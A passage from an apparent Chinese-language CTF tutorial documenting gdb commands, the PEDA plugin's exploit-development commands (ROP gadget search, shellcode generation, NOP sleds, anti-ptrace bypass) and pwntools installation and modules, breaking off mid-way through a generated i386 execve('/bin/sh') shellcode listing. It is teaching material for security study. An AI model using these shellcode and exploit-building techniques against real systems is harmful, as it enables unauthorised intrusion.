仍然保留。</p><h4 id="thread-apply-all-bt">thread apply all bt</h4><p>打印出所有线程的堆栈信息。</p><h4 id="generate-core-file">generate-core-file</h4><p>将调试中的进程生成内核转储文件。</p><h4 id="directory----dir">directory -- dir</h4><p>设置查找源文件的路径。</p><p>或者使用 gdb 的 <code>-d</code> 参数，例如：<code>gdb a.out -d /search/code/</code></p><h3 id="x24-gdb-peda-gdb-gef">0x24 gdb-peda (gdb-gef)</h3><p>当 gdb 启动时，它会在当前用户的主目录中寻找一个名为 <code>.gdbinit</code> 的文件；如果该文件存在，则 gdb 就执行该文件中的所有命令。通常，该文件用于简单的配置命令。但是 <code>.gdbinit</code> 的配置十分繁琐，因此对 gdb 的扩展通常用插件的方式来实现，通过 python 的脚本可以很方便的实现需要的功能。</p><p>PEDA（Python Exploit Development Assistance for GDB）是一个强大的 gdb 插件。它提供了高亮显示反汇编代码、寄存器、内存信息等人性化的功能。同时，PEDA 还有一些实用的新命令，比如 checksec 可以查看程序开启了哪些安全机制等等。</p><h4 id="安装">安装</h4><p>安装 peda 需要的软件包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install nasm micro-inetd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libc6-dbg vim ssh</span></span><br></pre></td></tr></table></figure><p>安装 peda：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"DONE! debug your program with gdb and enjoy"</span></span></span><br></pre></td></tr></table></figure><p>如果系统为 Arch Linux，则可以直接安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yaourt -S peda</span></span><br></pre></td></tr></table></figure><h4 id="peda命令">peda命令</h4><h5 id="aslr">aslr</h5><blockquote><p>显示/设置 gdb 的 ASLR</p></blockquote><h5 id="asmsearch">asmsearch</h5><blockquote><p>Search for ASM instructions in memory</p></blockquote><ul><li><code>asmsearch "int 0x80"</code></li><li><code>asmsearch "add esp, ?" libc</code> ##### assemble &gt; On the fly assemble and execute instructions using NASM</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assemble $pc</span><br><span class="line">&gt; mov al, 0xb</span><br><span class="line">&gt; int 0x80</span><br><span class="line">&gt; end</span><br></pre></td></tr></table></figure><h5 id="checksec">checksec</h5><ul><li>检查二进制文件的安全选项</li></ul><h5 id="cmpmem">cmpmem</h5><ul><li>Compare content of a memory region with a file</li><li><code>cmpmem 0x08049000 0x0804a000 data.mem</code></li></ul><h5 id="context">context</h5><ul><li>Display various information of current execution context</li><li><code>context_code</code> -- Display nearby disassembly at $PC of current execution context</li><li><code>context_register</code> -- Display register information of current execution context</li><li><code>context_stack</code>- - Display stack of current execution context</li><li><code>context reg</code><br></li><li><code>context code</code></li><li><code>context stack</code></li></ul><h5 id="crashdump">crashdump</h5><ul><li>Display crashdump info and save to file</li></ul><h5 id="deactive">deactive</h5><ul><li>Bypass a function by ignoring its execution (eg sleep/alarm)</li><li><code>deactive setresuid</code></li><li><code>deactive chdir</code></li></ul><h5 id="distance">distance</h5><ul><li>Calculate distance between two addresses</li></ul><h5 id="dumpargs">dumpargs</h5><ul><li>在调用指令停止时显示传递给函数的参数</li></ul><h5 id="dumpmem">dumpmem</h5><ul><li>Dump content of a memory region to raw binary file -<code>dumpmem libc.mem libc</code></li></ul><h5 id="dumprop">dumprop</h5><ul><li>在特定的内存范围显示 ROP gadgets</li><li><code>dumprop binary "pop"</code></li></ul><h5 id="eflags">eflags</h5><ul><li>Display/set/clear/toggle value of eflags register</li><li><code>elfheader</code><ul><li>获取正在调试的 ELF 文件的头信息</li><li><code>elfheader</code></li></ul></li><li><code>elfheader .got</code></li></ul><h5 id="elfsymbol">elfsymbol</h5><ul><li>从 ELF 文件中获取没有调试信息的符号信息</li><li><code>elfsymbol</code></li><li><code>elfsymbol printfgennop</code></li></ul><h5 id="gennop">gennop</h5><ul><li>Generate abitrary length NOP sled using given characters</li><li><code>gennop 500</code></li><li><code>gennop 500 "\x90"</code></li></ul><h5 id="getfile">getfile</h5><ul><li>Get exec filename of current debugged process</li></ul><h5 id="getpid">getpid</h5><ul><li>Get PID of current debugged process</li></ul><h5 id="goto">goto</h5><ul><li>Continue execution at an address</li></ul><h5 id="help">help</h5><ul><li>Print the usage manual for PEDA commands</li></ul><h5 id="hexdump">hexdump</h5><ul><li>Display hex/ascii dump of data in memory</li><li><code>hexdump $sp 64</code></li><li><code>hexdump $sp /20</code></li></ul><h5 id="hexprint">hexprint</h5><ul><li>Display hexified of data in memory</li><li><code>hexprint $sp 64</code></li><li><code>hexprint $sp /20</code></li></ul><h5 id="jmpcall">jmpcall</h5><ul><li>Search for JMP/CALL instructions in memory</li><li><code>jmpcall eax</code></li><li><code>jmpcall esp libc</code></li></ul><h5 id="loadmem">loadmem</h5><ul><li>Load contents of a raw binary file to memory</li><li><code>loadmem stack.mem 0xbffdf000</code></li></ul><h5 id="lookup">lookup</h5><ul><li>搜索属于内存范围的地址的所有地址/引用</li><li><code>lookup address stack libc</code></li><li><code>lookup pointer stack ld-2</code></li></ul><h5 id="nearpc">nearpc</h5><ul><li>Disassemble instructions nearby current PC or given address</li><li><code>nearpc 20</code></li><li><code>nearpc 0x08048484</code></li></ul><h5 id="nextcall">nextcall</h5><ul><li>Step until next 'call' instruction in specific memory range</li><li><code>nextcall cpy</code></li></ul><h5 id="nextjmp">nextjmp</h5><ul><li>Step until next 'j*' instruction in specific memory range</li><li><code>nextjmp</code></li></ul><h5 id="nxtest">nxtest</h5><p>-- Perform real NX test to see if it is enabled/supported by OS</p><h5 id="patch">patch</h5><ul><li>使用字符串/十六进制字符串/整形数</li><li><code>patch $esp 0xdeadbeef</code></li><li><code>patch $eax "the long string"</code></li><li><code>patch (multiple lines)</code></li></ul><h5 id="pattern">pattern</h5><ul><li>生成，搜索或写入循环 pattern 到内存</li><li><code>pattern_arg</code> -- Set argument list with cyclic pattern</li><li><code>pattern_create</code> -- Generate a cyclic pattern</li><li><code>pattern_env</code> -- Set environment variable with a cyclic patter</li><li><code>pattern_offset</code> -- Search for offset of a value in cyclic pattern</li><li><code>pattern_patch</code> -- Write a cyclic pattern to memory</li><li><code>pattern_search</code> -- Search a cyclic pattern in registers and memory</li><li><code>pattern create 2000</code></li><li><code>pattern create 2000 input</code></li><li><code>pattern offset $pc</code></li><li><code>pattern search</code></li><li><code>pattern patch 0xdeadbeef 100</code></li></ul><h5 id="payload">payload</h5><ul><li>Generate various type of ROP payload using ret2plt</li><li><code>payload copybytes</code></li><li><code>payload copybytes target "/bin/sh"</code></li><li><code>payload copybytes 0x0804a010 offset</code></li></ul><h5 id="pdisass">pdisass</h5><ul><li>Format output of gdb disassemble command with colors</li><li><code>pdisass $pc /20</code></li></ul><h5 id="pltbreak">pltbreak</h5><ul><li>Set breakpoint at PLT functions match name regex</li><li><code>pltbreak cpy</code></li></ul><h5 id="procinfo">procinfo</h5><ul><li>显示调试进程的 /proc/pid/</li><li><code>procinfo</code></li><li><code>procinfo fd</code></li></ul><h5 id="profile">profile</h5><ul><li>Simple profiling to count executed instructions in the program</li></ul><h5 id="pyhelp">pyhelp</h5><ul><li>Wrapper for python built-in help</li><li><code>pyhelp peda</code></li><li><code>pyhelp hex2str</code></li></ul><h5 id="pshow">pshow</h5><ul><li>显示各种 PEDA 选项和其他设置</li><li><code>pshow</code></li><li><code>pshow option context</code></li></ul><h5 id="pset">pset</h5><ul><li>设置各种 PEDA 选项和其他设置</li><li><code>pset arg '"A"*200'</code></li><li><code>pset arg 'cyclic_pattern(200)'</code><ul><li><code>pset env EGG 'cyclic_pattern(200)'</code></li><li><code>pset option context "code,stack"</code></li><li><code>pset option badchars "\r\n"</code></li></ul></li></ul><h5 id="readelf">readelf</h5><ul><li>获取 ELF 的文件头信息</li><li><code>readelf libc .text</code></li></ul><h5 id="refsearch">refsearch</h5><ul><li>Search for all references to a value in memory ranges</li><li><code>refsearch "/bin/sh"</code></li><li><code>refsearch 0xdeadbeef</code></li></ul><h5 id="reload">reload</h5><ul><li>Reload PEDA sources, keep current options untouch</li></ul><h5 id="ropgadget">ropgadget</h5><ul><li>获取二进制或库的常见 ROP gadgets</li><li><code>ropgadget</code></li><li><code>ropgadget libc</code></li></ul><h5 id="ropsearch">ropsearch</h5><ul><li>搜索内存中的 ROP gadgets</li><li><code>ropsearch "pop eax"</code></li><li><code>ropsearch "xchg eax, esp" libc</code></li></ul><h5 id="searchmemfind">searchmem|find</h5><ul><li>搜索内存中的 pattern, 支持正则表达式搜索</li><li><code>find "/bin/sh" libc</code></li><li><code>find 0xdeadbeef all</code></li><li><code>find "..\x04\x08" 0x08048000 0x08049000</code></li><li><code>searchmem</code> -- Search for a pattern in memory; support regex search</li><li><code>session</code> -- Save/restore a working gdb session to file as a script</li></ul><h5 id="set">set</h5><ul><li>Set various PEDA options and other settings</li><li><code>set exec-wrapper ./exploit.py</code></li></ul><h5 id="sgrep">sgrep</h5><ul><li>Search for full strings contain the given pattern</li></ul><h5 id="shellcode">shellcode</h5><ul><li>生成或下载常见的 shellcode</li><li><code>shellcode x86/linux exec</code></li></ul><h5 id="show">show</h5><ul><li>Show various PEDA options and other settings</li></ul><h5 id="skeleton">skeleton</h5><ul><li>生成 python exploit 代码模板</li><li><code>skeleton argv exploit.py</code></li></ul><h5 id="skipi">skipi</h5><ul><li>Skip execution of next count instructions</li></ul><h5 id="snapshot">snapshot</h5><ul><li>Save/restore process's snapshot to/from file</li><li><code>snapshot save</code></li><li><code>snapshot restore</code></li></ul><h5 id="start">start</h5><ul><li>Start debugged program and stop at most convenient entry</li></ul><h5 id="stepuntil">stepuntil</h5><ul><li>Step until a desired instruction in specific memory range</li><li><code>stepuntil cmp</code></li><li><code>stepuntil xor</code></li></ul><h5 id="strings">strings</h5><ul><li>Display printable strings in memory</li><li><code>strings</code></li><li><code>strings binary 4</code></li></ul><h5 id="substr">substr</h5><ul><li>Search for substrings of a given string/number in memory</li></ul><h5 id="telescope">telescope</h5><ul><li>Display memory content at an address with smart dereferences</li><li><code>telescope 40</code></li><li><code>telescope 0xb7d88000 40</code></li></ul><h5 id="tracecall">tracecall</h5><ul><li>Trace function calls made by the program</li><li><code>tracecall</code></li><li><code>tracecall "cpy,printf"</code></li><li><code>tracecall "-puts,fflush"</code></li></ul><h5 id="traceinst">traceinst</h5><ul><li>Trace specific instructions executed by the program</li><li><code>traceinst 20</code></li><li><code>traceinst "cmp,xor"</code></li></ul><h5 id="unptrace">unptrace</h5><ul><li>Disable anti-ptrace detection</li><li><code>unptrace</code></li></ul><h5 id="utils">utils</h5><ul><li>Miscelaneous utilities from utils module</li></ul><h5 id="vmmap">vmmap</h5><ul><li>在调试过程中获取段的虚拟映射地址范围</li><li><code>cmmap</code></li><li><code>vmmap binary / libc</code><ul><li><code>vmmap 0xb7d88000</code></li></ul></li></ul><h5 id="waitfor">waitfor</h5><ul><li>Try to attach to new forked process; mimic "attach -waitfor"</li><li><code>waitfor</code><br></li><li><code>waitfor myprog -c</code></li></ul><h5 id="xinfo">xinfo</h5><ul><li>Display detail information of address/registers</li><li><code>xinfo register eax</code></li><li><code>xinfo 0xb7d88000</code></li></ul><h5 id="xormem">xormem</h5><ul><li>用一个 key 来对一个内存区域执行 XOR 操作</li><li><code>xormem 0x08049000 0x0804a000 “thekey”</code></li></ul><h5 id="xprint">xprint</h5><ul><li>Extra support to GDB's print command</li></ul><h5 id="xrefs">xrefs</h5><ul><li>Search for all call/data access references to a function/variable</li></ul><h5 id="xuntil">xuntil</h5><ul><li>Continue execution until an address or function</li></ul><h4 id="使用-peda-和-python-编写-gdb-脚本">使用 PEDA 和 Python 编写 gdb 脚本</h4><h5 id="pedacmd">pedacmd</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 交互式命令</span><br></pre></td></tr></table></figure><ul><li>没有返回值<ul><li>例如：<code>pedacmd.context_register()</code></li></ul><h5 id="peda">peda</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 与 gdb 交互的后端功能</span><br></pre></td></tr></table></figure></li><li>有返回值<ul><li>例如：<code>peda.getreg("eax")</code></li></ul></li></ul><h5 id="小工具">小工具</h5><ul><li>例如：<code>to_int()</code>、<code>format_address()</code></li><li>获得帮助<ul><li><code>pyhelp peda</code></li><li><code>pyhelp hex2str</code></li></ul></li></ul><h5 id="单行交互式使用">单行／交互式使用</h5><ul><li><code>gdb-peda$ python print peda.get_vmmap()</code></li></ul><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ python</span><br><span class="line">&gt; status = peda.get_status()</span><br><span class="line">&gt; while status == &quot;BREAKPOINT&quot;:</span><br><span class="line">&gt;    peda.execute(&quot;continue&quot;)</span><br><span class="line">&gt; end</span><br></pre></td></tr></table></figure></p><h5 id="外部脚本">外部脚本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># myscript.py</span><br><span class="line">def myrun(size):</span><br><span class="line">argv = cyclic_pattern(size)</span><br><span class="line">peda.execute(&quot;set arg %s&quot; % argv)</span><br><span class="line">peda.execute(&quot;run&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ source myscript.py</span><br><span class="line">gdb-peda$ python myrun(100)</span><br></pre></td></tr></table></figure><h2 id="x30-pwntools">0x30 pwntools</h2><h3 id="x31-安装">0x31 安装</h3><ol type="1"><li><p>安装binutils：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools-binutils</span><br><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo apt-add-repository ppa:pwntools/binutils</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install binutils-arm-linux-gnu</span><br></pre></td></tr></table></figure></li><li><p>安装capstone：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aquynh/capstone</span><br><span class="line">cd capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></li><li><p>安装pwntools:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br><span class="line">sudo pip install pwntools</span><br></pre></td></tr></table></figure></li></ol><p>如果你在使用 Arch Linux，则可以通过 AUR 直接安装，这个包目前是由我维护的，如果有什么问题，欢迎与我交流：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ yaourt -S python2-pwntools</span><br><span class="line">或者</span><br><span class="line">$ yaourt -S python2-pwntools-git</span><br></pre></td></tr></table></figure><p>但是由于 Arch 没有 PPA 源，如果想要支持更多的体系结构（如 arm, aarch64 等），只能手动编译安装相应的 binutils，使用下面的脚本，注意将变量 <code>V</code> 和 <code>ARCH</code> 换成你需要的。<a href="https://ftp.gnu.org/gnu/binutils/" target="_blank" rel="noopener">binutils</a><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/others/2.4.1_pwntools/binutils.sh" target="_blank" rel="noopener">源码</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">V = 2.29   <span class="comment"># binutils version</span></span><br><span class="line">ARCH = arm <span class="comment"># target architecture</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget -nc https://ftp.gnu.org/gnu/binutils/binutils-<span class="variable">$V</span>.tar.xz</span><br><span class="line">wget -nc https://ftp.gnu.org/gnu/binutils/binutils-<span class="variable">$V</span>.tar.xz.sig</span><br><span class="line"></span><br><span class="line"><span class="comment"># gpg --keyserver keys.gnupg.net --recv-keys C3126D3B4AE55E93</span></span><br><span class="line"><span class="comment"># gpg --verify binutils-$V.tar.xz.sig</span></span><br><span class="line"></span><br><span class="line">tar xf binutils-<span class="variable">$V</span>.tar.xz</span><br><span class="line"></span><br><span class="line">mkdir binutils-build</span><br><span class="line"><span class="built_in">cd</span> binutils-build</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> AR=ar</span><br><span class="line"><span class="built_in">export</span> AS=as</span><br><span class="line"></span><br><span class="line">../binutils-<span class="variable">$V</span>/configure \</span><br><span class="line">    --prefix=/usr/<span class="built_in">local</span> \</span><br><span class="line">    --target=<span class="variable">$ARCH</span>-unknown-linux-gnu \</span><br><span class="line">    --<span class="built_in">disable</span>-static \</span><br><span class="line">    --<span class="built_in">disable</span>-multilib \</span><br><span class="line">    --<span class="built_in">disable</span>-werror \</span><br><span class="line">    --<span class="built_in">disable</span>-nls</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>测试安装是否成功：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'nop'</span>)</span><br><span class="line"><span class="string">'\x90'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'nop'</span>, arch=<span class="string">'arm'</span>)</span><br><span class="line"><span class="string">'\x00\xf0 \xe3'</span></span><br></pre></td></tr></table></figure><h3 id="x32-模块简介">0x32 模块简介</h3><p>Pwntools 分为两个模块，一个是 <code>pwn</code>，简单地使用 <code>from pwn import *</code> 即可将所有子模块和一些常用的系统库导入到当前命名空间中，是专门针对 CTF 比赛的；而另一个模块是 <code>pwnlib</code>，它更推荐你仅仅导入需要的子模块，常用于基于 pwntools 的开发。</p><p>下面是 pwnlib 的一些子模块（常用模块和函数加粗显示）：</p><ul><li><code>adb</code>：安卓调试桥</li><li><code>args</code>：命令行魔法参数</li><li><strong>asm</strong>：汇编和反汇编，支持 i386/i686/amd64/thumb 等</li><li><code>constants</code>：对不同架构和操作系统的常量的快速访问</li><li><code>config</code>：配置文件</li><li><code>context</code>：设置运行时变量</li><li><strong>dynelf</strong>：用于远程函数泄露</li><li><code>encoders</code>：对 shellcode 进行编码</li><li><strong>elf</strong>：用于操作 ELF 可执行文件和库</li><li><code>flag</code>：提交 flag 到服务器</li><li><strong>fmtstr</strong>：格式化字符串利用工具</li><li><strong>gdb</strong>：与 gdb 配合使用</li><li><code>libcdb</code>：libc 数据库</li><li><code>log</code>：日志记录</li><li><strong>memleak</strong>：用于内存泄露</li><li><strong>rop</strong>：ROP 利用模块，包括 rop 和 srop</li><li><code>runner</code>：运行 shellcode</li><li><strong>shellcraft</strong>：shellcode 生成器: <code>system('/bin/sh')</code></li><li><code>term</code>：终端处理</li><li><code>timeout</code>：超时处理</li><li><strong>tubes</strong>：能与 sockets, processes, ssh 等进行连接</li><li><code>ui</code>：与用户交互</li><li><code>useragents</code>：useragent 字符串数据库</li><li><strong>util</strong>：一些实用小工具</li></ul><h3 id="x33-使用-pwntools">0x33 使用 Pwntools</h3><p>下面我们对常用模块和函数做详细的介绍。</p><h4 id="tubes">tubes</h4><p>在一次漏洞利用中，首先当然要与二进制文件或者目标服务器进行交互，这就要用到 tubes 模块。</p><p>主要函数在 <code>pwnlib.tubes.tube</code> 中实现，子模块只实现某管道特殊的地方。四种管道和相对应的子模块如下：</p><ul><li>pwnlib.tubes.process：进程<ul><li><code>&gt;&gt;&gt; p = process('/bin/sh')</code></li></ul></li><li><code>pwnlib.tubes.serialtube</code>：串口</li><li>·pwnlib.tubes.sock·：套接字<ul><li><code>&gt;&gt;&gt; r = remote('127.0.0.1', 1080)</code></li><li><code>&gt;&gt;&gt; l = listen(1080)</code></li></ul></li><li><code>pwnlib.tubes.ssh</code>：SSH<ul><li><code>&gt;&gt;&gt; s = ssh(host='example.com</code>, user='name', password='passwd')`</li></ul></li><li><code>pwnlib.tubes.tube</code> 中的主要函数：<ul><li><code>interactive()</code>：可同时读写管道，相当于回到 shell 模式进行交互，在取得 shell 之后调用</li><li><code>recv(numb=1096, timeout=default)</code>：接收指定字节数的数据</li><li><code>recvall()</code>：接收数据直到 EOF</li><li><code>recvline(keepends=True)</code>：接收一行，可选择是否保留行尾的 <code>\n</code></li><li><code>recvrepeat(timeout=default)</code>：接收数据直到 EOF 或 timeout</li><li><code>recvuntil(delims, timeout=default)</code>：接收数据直到 delims 出现</li><li><code>send(data)</code>：发送数据</li><li><code>sendline(data)</code>：发送一行，默认在行尾加 <code>\n</code></li><li><code>close()</code>：关闭管道</li></ul></li></ul><p>下面是一个例子，先使用 listen 开启一个本地的监听端口，然后使用 remote 开启一个套接字管道与之交互：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; l = listen()</span><br><span class="line">[x] Trying to bind to 0.0.0.0 on port 0</span><br><span class="line">[x] Trying to bind to 0.0.0.0 on port 0: Trying 0.0.0.0</span><br><span class="line">[+] Trying to bind to 0.0.0.0 on port 0: Done</span><br><span class="line">[x] Waiting for connections on 0.0.0.0:46147</span><br><span class="line">&gt;&gt;&gt; r = remote(&apos;localhost&apos;, l.lport)</span><br><span class="line">[x] Opening connection to localhost on port 46147</span><br><span class="line">[x] Opening connection to localhost on port 46147: Trying ::1</span><br><span class="line">[x] Opening connection to localhost on port 46147: Trying 127.0.0.1</span><br><span class="line">[+] Opening connection to localhost on port 46147: Done</span><br><span class="line">&gt;&gt;&gt; [+] Waiting for connections on 0.0.0.0:46147: Got connection from 127.0.0.1 on port 38684</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; c = l.wait_for_connection()</span><br><span class="line">&gt;&gt;&gt; r.send(&apos;hello\n&apos;)</span><br><span class="line">&gt;&gt;&gt; c.recv()</span><br><span class="line">&apos;hello\n&apos;</span><br><span class="line">&gt;&gt;&gt; r.send(&apos;hello\n&apos;)</span><br><span class="line">&gt;&gt;&gt; c.recvline()</span><br><span class="line">&apos;hello\n&apos;</span><br><span class="line">&gt;&gt;&gt; r.sendline(&apos;hello&apos;)</span><br><span class="line">&gt;&gt;&gt; c.recv()</span><br><span class="line">&apos;hello\n&apos;</span><br><span class="line">&gt;&gt;&gt; r.sendline(&apos;hello&apos;)</span><br><span class="line">&gt;&gt;&gt; c.recvline()</span><br><span class="line">&apos;hello\n&apos;</span><br><span class="line">&gt;&gt;&gt; r.sendline(&apos;hello&apos;)</span><br><span class="line">&gt;&gt;&gt; c.recvline(keepends=False)</span><br><span class="line">&apos;hello&apos;</span><br><span class="line">&gt;&gt;&gt; r.send(&apos;hello world&apos;)</span><br><span class="line">&gt;&gt;&gt; c.recvuntil(&apos;hello&apos;)</span><br><span class="line">&apos;hello&apos;</span><br><span class="line">&gt;&gt;&gt; c.recv()</span><br><span class="line">&apos; world&apos;</span><br><span class="line">&gt;&gt;&gt; c.close()</span><br><span class="line">[*] Closed connection to 127.0.0.1 port 38684</span><br><span class="line">&gt;&gt;&gt; r.close()</span><br><span class="line">[*] Closed connection to localhost port 46147</span><br></pre></td></tr></table></figure><p>下面是一个与进程交互的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p = process(&apos;/bin/sh&apos;)</span><br><span class="line">[x] Starting local process &apos;/bin/sh&apos;</span><br><span class="line">[+] Starting local process &apos;/bin/sh&apos;: pid 26481</span><br><span class="line">&gt;&gt;&gt; p.sendline(&apos;sleep 3; echo hello world;&apos;)</span><br><span class="line">&gt;&gt;&gt; p.recvline(timeout=1)</span><br><span class="line">&apos;hello world\n&apos;</span><br><span class="line">&gt;&gt;&gt; p.sendline(&apos;sleep 3; echo hello world;&apos;)</span><br><span class="line">&gt;&gt;&gt; p.recvline(timeout=1)</span><br><span class="line">&apos;&apos;</span><br><span class="line">&gt;&gt;&gt; p.recvline(timeout=5)</span><br><span class="line">&apos;hello world\n&apos;</span><br><span class="line">&gt;&gt;&gt; p.interactive()</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">whoami</span><br><span class="line">firmy</span><br><span class="line">^C[*] Interrupted</span><br><span class="line">&gt;&gt;&gt; p.close()</span><br><span class="line">[*] Stopped process &apos;/bin/sh&apos; (pid 26481)</span><br></pre></td></tr></table></figure><h4 id="shellcraft">shellcraft</h4><p>使用 shellcraft 模块可以生成对应架构和 shellcode 代码，直接使用链式调用的方法就可以得到，首先指定体系结构，再指定操作系统：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print shellcraft.i386.nop().strip(&apos;\n&apos;)</span><br><span class="line">    nop</span><br><span class="line">&gt;&gt;&gt; print shellcraft.i386.linux.sh()</span><br><span class="line">    /* execve(path=&apos;/bin///sh&apos;, argv=[&apos;sh&apos;], envp=0) */</span><br><span class="line">    /* push &apos;/bin///sh\x00&apos; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [&apos;sh\x00&apos;] */</span><br><span class="line">    /* push &apos;sh\x00\x00&apos; */</span><br><span class="line">    push 0x1010101</span><br><span class="line">    xor dword ptr [esp], 0x1016972</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push 4</span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* &apos;sh\x00&apos; */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    